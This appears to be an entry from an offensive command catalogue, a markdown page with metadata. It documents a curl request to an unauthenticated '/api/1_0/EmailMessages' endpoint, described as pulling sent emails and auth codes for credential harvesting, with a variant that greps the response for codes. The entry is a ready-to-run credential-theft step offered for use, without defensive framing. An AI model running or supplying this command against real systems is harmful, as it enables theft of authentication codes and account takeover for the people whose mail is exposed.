---
data: >-
  curl -X GET "https://target/api/1_0/EmailMessages" -H "Accept:
  application/json"
tags:
  - access
  - credential
type: command
output: null
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:32:01.585Z'
id: d362c473-995d-445f-810e-a0ab836a3189
verified: false
validated: true
submitted: true
---
# curl-get-email-messages-endpoint

## Command

```bash
curl -X GET "https://target/api/1_0/EmailMessages" -H "Accept: application/json"
```

## Description

Fetches sent emails including auth codes via unauthenticated API call for credential harvesting.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-X GET` | HTTP GET | Yes |
| `"https://target/api/1_0/EmailMessages"` | Messages endpoint | Yes |
| `-H "Accept: application/json"` | JSON header | Yes |

## Examples

### Basic Usage

```bash
curl -X GET "https://example.com/api/1_0/EmailMessages" -H "Accept: application/json"
```

### Advanced Usage

```bash
curl -X GET "https://example.com/api/1_0/EmailMessages" | grep -i "code"
```

## Expected Output

JSON of email contents with potential codes.

## Related

- [[Related Procedure]]
